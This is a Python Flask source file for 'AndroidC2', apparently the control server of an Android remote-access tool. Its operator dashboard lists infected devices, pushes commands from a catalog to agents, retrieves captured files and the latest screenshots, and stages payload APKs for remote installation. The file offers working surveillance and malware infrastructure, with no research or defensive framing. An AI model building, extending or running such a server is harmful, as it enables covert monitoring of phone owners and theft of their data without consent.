"""AndroidC2 — main entry point."""

import os
import shutil
from pathlib import Path

from flask import (
    Flask,
    jsonify,
    redirect,
    render_template,
    request,
    send_file,
    session,
    url_for,
)
from sqlalchemy import update

from config import Config

from c2.agent_api import agent_api
from c2.agent_ws import (
    agent_online,
    register_agent_ws,
    send_command_to_agent,
)
from c2.auth import (
    blocked_for,
    clear_failures,
    csrf_protect,
    csrf_token,
    is_authenticated,
    key_fingerprint,
    operator_required,
    record_failure,
    verify_password,
)
from c2.command_builder import COMMAND_CATALOG, build_command
from c2.file_handler import delete_device_files, verify_stored_path
from c2.reaper import start_reaper
from c2.timeutil import utcnow
from c2.ws_dashboard import broadcast, init_socketio, socketio
from database import db, init_db
from models import CapturedFile, Command, Device, LogEntry


def _migrate_legacy_uploads(app) -> int:
    """Move captures out of static/ and repoint the database at the new root.

    static/ is served verbatim by Flask, so anything left there is readable
    without authentication. Draining it once at startup is the migration.
    """
    legacy = Path(Config.LEGACY_UPLOAD_FOLDER)
    target = Path(Config.UPLOAD_FOLDER)

    if not legacy.is_dir():
        return 0

    moved = 0
    for entry in legacy.rglob("*"):
        if not entry.is_file() or entry.name == ".gitkeep":
            continue
        relative = entry.relative_to(legacy)
        destination = target / relative
        destination.parent.mkdir(parents=True, exist_ok=True)
        shutil.move(str(entry), str(destination))
        moved += 1

    if moved:
        old_prefix = f"{legacy.resolve()}%"
        new_prefix = f"{target.resolve()}"
        with app.app_context():
            db.session.execute(
                update(CapturedFile)
                .where(CapturedFile.stored_path.like(old_prefix))
                .values(stored_path=db.func.replace(
                    CapturedFile.stored_path,
                    f"{legacy.resolve()}",
                    new_prefix,
                ))
            )
            db.session.commit()

    # Drop the now-empty tree, but keep the placeholder the repo tracks.
    for dirpath, _dirnames, filenames in os.walk(legacy, topdown=False):
        if any(name != ".gitkeep" for name in filenames):
            continue
        if any(Path(dirpath).iterdir()):
            continue
        try:
            os.rmdir(dirpath)
        except OSError:
            pass

    print(f"[startup] migrated {moved} captured file(s) to {target}", flush=True)
    return moved


def create_app(start_background: bool = True):
    app = Flask(__name__, static_folder="static", template_folder="templates")
    app.config.from_object(Config)

    os.makedirs(Config.UPLOAD_FOLDER, exist_ok=True)
    os.makedirs(os.path.join(Config.UPLOAD_FOLDER, "to_agent"), exist_ok=True)

    init_db(app)
    _migrate_legacy_uploads(app)

    init_socketio(app)
    app.register_blueprint(agent_api)
    register_agent_ws()

    # ---------------------------------------------------------------- auth

    @app.route("/login", methods=["GET", "POST"])
    def login():
        if request.method == "POST":
            remaining = blocked_for()
            if remaining > 0:
                return render_template(
                    "login.html",
                    error=f"too many attempts — retry in {int(remaining)}s",
                ), 429

            if verify_password(request.form.get("password", "")):
                clear_failures()
                session.clear()
                session["operator"] = True
                session.permanent = True
                csrf_token()
                nxt = request.form.get("next") or url_for("index")
                if not nxt.startswith("/") or nxt.startswith("//"):
                    nxt = url_for("index")
                return redirect(nxt)

            record_failure()
            return render_template("login.html", error="wrong password"), 401

        if is_authenticated():
            return redirect(url_for("index"))
        return render_template("login.html", error=None)

    @app.route("/logout", methods=["POST"])
    @operator_required
    @csrf_protect
    def logout():
        session.clear()
        return redirect(url_for("login"))

    @app.route("/api/session")
    @operator_required
    def api_session():
        return jsonify({"authenticated": True, "csrf_token": csrf_token()})

    # ------------------------------------------------------------------ ui

    @app.route("/")
    @operator_required
    def index():
        return render_template("index.html", csrf_token=csrf_token())

    # ------------------------------------------------------------- devices

    @app.route("/api/devices")
    @operator_required
    def api_devices():
        devices = Device.query.order_by(Device.last_seen.desc()).all()
        result = []
        for d in devices:
            data = d.to_dict()
            data["ws_online"] = agent_online(d.device_id)
            result.append(data)
        return jsonify(result)

    @app.route("/api/device/<int:dev_id>")
    @operator_required
    def api_device(dev_id):
        dev = db.get_or_404(Device, dev_id)
        data = dev.to_dict()
        data["ws_online"] = agent_online(dev.device_id)
        return jsonify(data)

    @app.route("/api/device/<int:dev_id>", methods=["DELETE"])
    @operator_required
    @csrf_protect
    def api_delete_device(dev_id):
        dev = db.get_or_404(Device, dev_id)
        # Rows go with the cascade; the bytes on disk need removing too.
        freed = delete_device_files(dev)
        db.session.delete(dev)
        db.session.commit()
        broadcast("device_removed", {"id": dev_id})
        return jsonify({"ok": True, "bytes_freed": freed})

    @app.route("/api/device/<int:dev_id>/notes", methods=["POST"])
    @operator_required
    @csrf_protect
    def api_set_notes(dev_id):
        dev = db.get_or_404(Device, dev_id)
        body = request.get_json(silent=True) or {}
        dev.notes = str(body.get("notes", ""))[:8000]
        db.session.commit()
        return jsonify({"ok": True})

    @app.route("/api/device/<int:dev_id>/tags", methods=["POST"])
    @operator_required
    @csrf_protect
    def api_set_tags(dev_id):
        dev = db.get_or_404(Device, dev_id)
        body = request.get_json(silent=True) or {}
        tags = body.get("tags", [])
        if not isinstance(tags, list):
            tags = [str(tags)]
        cleaned = [str(t).strip()[:32] for t in tags if str(t).strip()][:16]
        dev.tags = ",".join(cleaned)
        db.session.commit()
        return jsonify(dev.to_dict())

    # ------------------------------------------------------------ commands

    @app.route("/api/device/<int:dev_id>/commands")
    @operator_required
    def api_commands(dev_id):
        cmds = (Command.query.filter_by(device_id=dev_id)
                .order_by(Command.created_at.desc()).limit(200).all())
        return jsonify([c.to_dict() for c in cmds])

    def _queue_command(dev_id: int):
        dev = db.get_or_404(Device, dev_id)
        body = request.get_json(silent=True) or {}
        ctype = body.get("type")
        args = body.get("args") or {}
        if not isinstance(args, dict):
            return jsonify({"error": "bad_args"}), 400
        if ctype not in COMMAND_CATALOG:
            return jsonify({"error": "unknown_command"}), 400

        cmd = build_command(dev, ctype, args)
        pushed = send_command_to_agent(dev.device_id, {
            "id": cmd.id,
            "type": cmd.command_type,
            "args": cmd.args(),
        })
        if pushed:
            cmd.status = "sent"
            cmd.delivered_at = utcnow()
            db.session.commit()

        broadcast("new_command", cmd.to_dict())
        return jsonify({"id": cmd.id, "pushed": pushed, "status": cmd.status})

    @app.route("/api/device/<int:dev_id>/command", methods=["POST"])
    @operator_required
    @csrf_protect
    def api_send_command(dev_id):
        return _queue_command(dev_id)

    # Kept as an alias: the old panel and the Telegram bridge both use /push.
    @app.route("/api/device/<int:dev_id>/push", methods=["POST"])
    @operator_required
    @csrf_protect
    def api_push_command(dev_id):
        return _queue_command(dev_id)

    @app.route("/api/catalog")
    @operator_required
    def api_catalog():
        return jsonify(COMMAND_CATALOG)

    # --------------------------------------------------------------- files

    @app.route("/api/device/<int:dev_id>/files")
    @operator_required
    def api_files(dev_id):
        files = (CapturedFile.query.filter_by(device_id=dev_id)
                 .order_by(CapturedFile.captured_at.desc()).limit(500).all())
        return jsonify([f.to_dict() for f in files])

    def _stored_or_404(cf: CapturedFile):
        safe = verify_stored_path(cf.stored_path)
        if not safe or not os.path.isfile(safe):
            return None, (jsonify({"error": "file_missing"}), 404)
        return safe, None

    @app.route("/api/file/<int:file_id>/raw")
    @operator_required
    def api_file_raw(file_id):
        cf = db.get_or_404(CapturedFile, file_id)
        safe, err = _stored_or_404(cf)
        if err:
            return err
        return send_file(safe, as_attachment=False,
                         download_name=cf.filename, mimetype=cf.mime_type)

    @app.route("/api/file/<int:file_id>/download")
    @operator_required
    def api_file_download(file_id):
        cf = db.get_or_404(CapturedFile, file_id)
        safe, err = _stored_or_404(cf)
        if err:
            return err
        return send_file(safe, as_attachment=True, download_name=cf.filename)

    @app.route("/api/device/<int:dev_id>/latest-screenshot")
    @operator_required
    def api_latest_screenshot(dev_id):
        cf = (CapturedFile.query
              .filter_by(device_id=dev_id, category="screenshot")
              .order_by(CapturedFile.captured_at.desc()).first())
        if not cf:
            return jsonify({"error": "no_screenshot"}), 404
        safe, err = _stored_or_404(cf)
        if err:
            return err
        return send_file(safe, mimetype=cf.mime_type)

    @app.route("/api/device/<int:dev_id>/upload_to_agent", methods=["POST"])
    @operator_required
    @csrf_protect
    def api_upload_to_agent(dev_id):
        dev = db.get_or_404(Device, dev_id)
        f = request.files.get("file")
        if not f or not f.filename:
            return jsonify({"error": "no_file"}), 400

        from c2.file_handler import sanitize_filename

        staged_name = (f"{sanitize_filename(dev.device_id, 'device')}_"
                       f"{sanitize_filename(f.filename, 'payload.apk')}")
        dest = os.path.join(Config.UPLOAD_FOLDER, "to_agent", staged_name)
        f.save(dest)

        cmd = build_command(dev, "install_apk", {"path": dest})
        return jsonify(cmd.to_dict())

    # ---------------------------------------------------------------- logs

    @app.route("/api/device/<int:dev_id>/logs")
    @operator_required
    def api_logs(dev_id):
        logs = (LogEntry.query.filter_by(device_id=dev_id)
                .order_by(LogEntry.created_at.desc()).limit(500).all())
        return jsonify([l.to_dict() for l in logs])

    # -------------------------------------------------------------- errors

    @app.errorhandler(404)
    def not_found(_):
        if request.path.startswith("/api/"):
            return jsonify({"error": "not_found"}), 404
        return render_template("login.html", error="not found"), 404

    @app.errorhandler(401)
    def unauthorized(_):
        return jsonify({"error": "unauthorized"}), 401

    @app.errorhandler(403)
    def forbidden(_):
        return jsonify({"error": "forbidden"}), 403

    if start_background:
        start_reaper(
            app,
            Config.AGENT_HEARTBEAT_TIMEOUT,
            Config.AGENT_REAPER_INTERVAL,
        )

    return app


def _startup_banner():
    from_env = bool(os.environ.get("C2_OPERATOR_PASSWORD"))
    print("=" * 58, flush=True)
    print(" AndroidC2 control server", flush=True)
    print(f" listening   http://{Config.C2_HOST}:{Config.C2_PORT}", flush=True)
    print(f" uploads     {Config.UPLOAD_FOLDER}", flush=True)
    print(f" database    {Config.SQLALCHEMY_DATABASE_URI}", flush=True)
    print(f" api key     {key_fingerprint(Config.API_KEY)}  "
          f"({len(Config.API_KEY)} chars, sha256/8)", flush=True)
    print("             agents must be built with this exact value", flush=True)
    if from_env:
        print(" operator    password from C2_OPERATOR_PASSWORD", flush=True)
    else:
        print(f" operator    {Config.OPERATOR_PASSWORD}", flush=True)
        print(f"             (persisted at {Path(Config.UPLOAD_FOLDER).parent}/"
              "c2_operator_password.secret)", flush=True)
    print("=" * 58, flush=True)


if __name__ == "__main__":
    _startup_banner()
    application = create_app()
    socketio.run(
        application,
        host=Config.C2_HOST,
        port=Config.C2_PORT,
        debug=False,
        allow_unsafe_werkzeug=True,
    )